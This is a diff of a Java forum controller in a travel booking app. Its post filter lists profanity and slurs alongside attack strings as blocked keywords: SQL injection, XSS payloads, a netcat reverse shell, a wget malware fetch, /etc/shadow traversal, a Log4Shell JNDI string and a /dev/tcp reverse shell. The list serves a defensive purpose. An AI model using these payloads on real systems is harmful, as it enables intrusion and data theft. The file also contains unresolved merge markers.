                 "fuck", "shit", "bitch", "asshole", "bastard", "cunt", "dick", "pussy", "whore", "slut",
                 "nigger", "faggot", "retard", "motherfucker", "cock", "twat", "damn", "hell", "crap", "jerk",
@@ -7122,34 +6574,26 @@ private TableView<Vol> tableViewVols;
                 "incendie criminel", "armes", "fusil", "kalachnikov", "mitraillette", "explosion", "dynamite",
                 "incitation à la haine", "racisme", "nazisme", "génocide", "massacre", "nettoyage ethnique",
 
-                // Agences de voyage en Tunisie
                 "Traveltodo", "JEKTIS TRAVEL", "Tunisie Promo", "Active Travel", "Tunisie Booking",
                 "TTA (Tunisian Travel Agency)", "Liberta Voyages", "Carthage Travel and Events (CTE)",
 
-                // Agences de voyage françaises
                 "Terres d'Aventure", "GO Voyages",
 
-                // Agences de voyage les plus populaires au monde
                 "Expedia", "Booking.com", "Agoda", "Lastminute.com", "Skyscanner", "Kiwi.com",
 
-                // SQL Injection
                 "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "DROP TABLE", "UNION SELECT",
                 "INSERT INTO", "DELETE FROM", "xp_cmdshell", "EXEC sp_executesql",
 
-                // XSS (Cross-Site Scripting)
                 "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                 "'><script>alert(1)</script>", "<svg/onload=alert('XSS')>",
                 "<iframe src='javascript:alert(1)'>", "document.cookie", "eval(",
 
-                // Command Injection
                 "; ls -la", "&& whoami", "|| cat /etc/passwd", "`id`", "$(reboot)",
                 "| nc -e /bin/sh", "wget http://malicious.com/malware.sh",
 
-                // Path Traversal
                 "../etc/passwd", "..\\..\\..\\windows\\system32\\cmd.exe",
                 "/etc/shadow", "/proc/self/environ",
 
-                // Common Payloads for Exploits
                 "${jndi:ldap://malicious.com/exploit}", "base64_decode(", "system(",
                 "shell_exec(", "import os", "subprocess.Popen(", "bash -i >& /dev/tcp/"
 
@@ -7169,49 +6613,39 @@ private TableView<Vol> tableViewVols;
         return false;
     }
 
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    // Helper method to check if a specific string contains bad words
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
     private boolean containsBadWords(String content, List<String> badWords) {
         if (content == null || content.isEmpty()) {
-            return false; // No content, so no bad words
+            return false;
         }
 
         String lowerCaseContent = content.toLowerCase();
         for (String word : badWords) {
             if (lowerCaseContent.contains(word.toLowerCase())) {
-                return true; // Bad word found
+                return true;
             }
         }
-        return false; // No bad words found
+        return false;
     }
 
     private boolean isPostingTooFrequently(Post post) {
         if (post == null) {
-            return false; // No post provided
+            return false;
         }
 
-        // Get the user's email using the post's userId
         String userEmail = forumServiceFP.getEmailById(post.getIdUser());
         if (userEmail == null || userEmail.isEmpty()) {
-            return false; // No user email found
+            return false;
         }
 
-        // Check if the user has posted within the cooldown period
         Long lastPostTime = userLastPostTime.get(userEmail);
         long currentTime = System.currentTimeMillis();
 
         if (lastPostTime != null && (currentTime - lastPostTime) < POST_COOLDOWN) {
-            return true; // User is posting too frequently
+            return true;
         }
 
-        // Update the user's last post time
         userLastPostTime.put(userEmail, currentTime);
-        return false; // User is not posting too frequently
+        return false;
     }
 
     @FXML
@@ -7229,7 +6663,6 @@ private TableView<Vol> tableViewVols;
             return;
         }
 
-        // Create a new Post object based on the selected type
         Post newPost = null;
         String userEmail = "";
 
@@ -7238,7 +6671,6 @@ private TableView<Vol> tableViewVols;
             String content = announcementContentField.getText().trim();
             String tags = announcementTagsField.getText().trim();
 
-            // Validate fields
             StringBuilder errors = new StringBuilder();
             if (title.isEmpty()) errors.append("- Title cannot be empty\n");
             if (title.length() > 50) errors.append("- Title must not exceed 50 characters\n");
@@ -7264,18 +6696,18 @@ private TableView<Vol> tableViewVols;
             }
 
             newPost = new Announcement(
-                    0, // postId (auto-generated)
+                    0,
                     selectedForum.getForumId(),
                     userId,
-                    0, // votes
-                    LocalDateTime.now(), // dateCreation
-                    LocalDateTime.now(), // dateModification
-                    announcementFileField.getText(), // cheminFichier
-                    announcementStatusComboBox.getValue(), // status
-                    0, // nbrSignal
-                    title, // announcementTitle
-                    content, // announcementContent
-                    tags // announcementTags
+                    0,
+                    LocalDateTime.now(),
+                    LocalDateTime.now(),
+                    announcementFileField.getText(),
+                    announcementStatusComboBox.getValue(),
+                    0,
+                    title,
+                    content,
+                    tags
             );
 
         } else if ("Survey".equals(selectedType)) {
@@ -7284,7 +6716,6 @@ private TableView<Vol> tableViewVols;
             List<String> choices = new ArrayList<>(choicesListView.getItems());
             List<String> users = new ArrayList<>(surveyUsersListView.getItems());
 
-            // Validate fields
             StringBuilder errors = new StringBuilder();
             if (question.isEmpty()) errors.append("- Question cannot be empty\n");
             if (question.length() > 200) errors.append("- Question must not exceed 200 characters\n");
@@ -7309,34 +6740,31 @@ private TableView<Vol> tableViewVols;
             }
 
             newPost = new Survey(
-                    0, // postId (auto-generated)
+                    0,
                     selectedForum.getForumId(),
                     userId,
-                    0, // votes
-                    LocalDateTime.now(), // dateCreation
-                    LocalDateTime.now(), // dateModification
-                    surveyFileField.getText(), // cheminFichier
-                    surveyStatusComboBox.getValue(), // status
-                    0, // nbrSignal
-                    question, // surveyQuestion
-                    tags, // surveyTags
-                    String.join(",", users) // surveyUserList
+                    0,
+                    LocalDateTime.now(),
+                    LocalDateTime.now(),
+                    surveyFileField.getText(),
+                    surveyStatusComboBox.getValue(),
+                    0,
+                    question,
+                    tags,
+                    String.join(",", users)
             );
         }
 
-        // Check for bad words in the post
         if (containsBadWords(newPost)) {
             showAlertFP("Spam Detected", "Your post contains inappropriate content. Please revise your post.", Alert.AlertType.ERROR);
             return;
         }
 
-        // Check if the user is posting too frequently
         if (isPostingTooFrequently(newPost)) {
             showAlertFP("Posting Too Frequently", "You are posting too quickly. Please wait a moment before posting again.", Alert.AlertType.ERROR);
             return;
         }
 
-        // Submit the post
         try {
             postService.ajouter(newPost);
 
@@ -7356,194 +6784,7 @@ private TableView<Vol> tableViewVols;
             showAlertFP("Error", "Failed to post: " + e.getMessage(), Alert.AlertType.ERROR);
         }
     }
-
-    @FXML
-    private void handleAddComment() {
-        if (currentPost == null) return;
-
-        String content = newCommentField.getText().trim();
-        if (content.isEmpty()) {
-            showError(newCommentField, commentErrorLabel, "Le commentaire ne peut pas être vide");
-            return;
-        }
-
-        // Create a new Comment object
-        Comment comment = new Comment(
-                0,
-                currentPost.getForumId(),
-                1, // Assuming this is the user ID
-                0,
-                LocalDateTime.now(),
-                LocalDateTime.now(),
-                "",
-                "active",
-                0,
-                content,
-                currentPost.getPostId()
-        );
-
-        // Check for bad words in the comment
-        if (containsBadWords(comment)) {
-            showAlertFP("Spam Detected", "Your comment contains inappropriate content. Please revise your comment.", Alert.AlertType.ERROR);
-            return;
-        }
-
-        // Check if the user is posting too frequently
-        if (isPostingTooFrequently(comment)) {
-            showAlertFP("Posting Too Frequently", "You are commenting too quickly. Please wait a moment before commenting again.", Alert.AlertType.ERROR);
-            return;
-        }
-
-        // Submit the comment
-        postService.ajouter(comment);
-        newCommentField.clear();
-        showComments(currentPost);
-    }
-
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-    //
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
 //--------------------------------------------------------------------------------------------------------
 
 
-
-//new aymen
-@FXML
-private void ChercherTableView_hotel() {
-    try {
-
-        HotelService HotelService = new HotelService();
-        List<Hotel> hotels = HotelService.chercher(page_hotel_combo_chercher.getSelectionModel().getSelectedItem(),page_hotel_chercher.getText()); // Fetch hotels from DB
-
-        if (hotels != null) {
-            // Clear and update ObservableList
-            HotelData.clear();
-            HotelData.addAll(hotels);
-
-
-
-            TableView_Hotel.setItems(HotelData);
-            TableView_Hotel.refresh(); // Force update
-
-        } else {
-            showAlert("Information", "Aucun Chambre trouvé.", Alert.AlertType.INFORMATION);
-        }
-    } catch (Exception e) {
-        showAlert("Erreur", "Une erreur est survenue lors de la mise à jour de la TableView.", Alert.AlertType.ERROR);
-        e.printStackTrace();
-
-    }
 }
-
-
-
-    public void exportTableViewToPDF() {
-        try {
-            // FileChooser for saving the PDF
-            FileChooser fileChooser = new FileChooser();
-            fileChooser.setTitle("Save PDF");
-            fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("PDF Files", "*.pdf"));
-            File file = fileChooser.showSaveDialog(null); // No need for Stage
-
-            if (file != null) {
-                Document document = new Document();
-                PdfWriter.getInstance(document, new FileOutputStream(file));
-                document.open();
-
-                // ================== ✅ ADD LOGO ==================
-                String logoPath = getClass().getResource("/images/secondry.png").getPath();
-                com.itextpdf.text.Image logo = com.itextpdf.text.Image.getInstance(logoPath);
-                logo.scaleToFit(100, 100);
-                logo.setAlignment(Element.ALIGN_LEFT);
-                document.add(logo);
-                // =================================================
-
-                // Title
-                Font titleFont = new Font(Font.FontFamily.HELVETICA, 18, Font.BOLD);
-                Paragraph title = new Paragraph("Hotel", titleFont);
-                title.setAlignment(Element.ALIGN_CENTER);
-                document.add(title);
-                document.add(Chunk.NEWLINE);
-
-                // Count visible columns (excluding "modifier" and "supprimer")
-                long visibleColumnCount = TableView_Hotel.getColumns().stream()
-                        .filter(column -> !column.getText().equalsIgnoreCase("modifier") &&
-                                !column.getText().equalsIgnoreCase("supprimer"))
-                        .count();
-
-                // Create PDF Table with the correct number of columns
-                PdfPTable pdfTable = new PdfPTable((int) visibleColumnCount);
-
-                // Add table headers (excluding "modifier" and "supprimer")
-                for (TableColumn<Hotel, ?> column : TableView_Hotel.getColumns()) {
-                    if (!column.getText().equalsIgnoreCase("modifier") &&
-                            !column.getText().equalsIgnoreCase("supprimer")) {
-                        PdfPCell header = new PdfPCell(new Phrase(column.getText()));
-                        header.setBackgroundColor(BaseColor.LIGHT_GRAY);
-                        pdfTable.addCell(header);
-                    }
-                }
-
-                // Add table data
-                ObservableList<Hotel> items = TableView_Hotel.getItems();
-                for (Hotel item : items) {
-                    for (TableColumn<Hotel, ?> column : TableView_Hotel.getColumns()) {
-                        if (!column.getText().equalsIgnoreCase("modifier") &&
-                                !column.getText().equalsIgnoreCase("supprimer")) {
-                            String cellValue = column.getCellObservableValue(item) != null ?
-                                    column.getCellObservableValue(item).getValue().toString() : "";
-                            pdfTable.addCell(cellValue);
-                        }
-                    }
-                }
-
-                document.add(pdfTable);
-                document.close();
-
-                System.out.println("PDF created successfully with logo!");
-
-            }
-
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-    }
-
-
-
-
-
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
-}
-=======
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-
-}
-
-
-
-
-
-<<<<<<< Updated upstream
-<<<<<<< Updated upstream
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
-=======
->>>>>>> Stashed changes
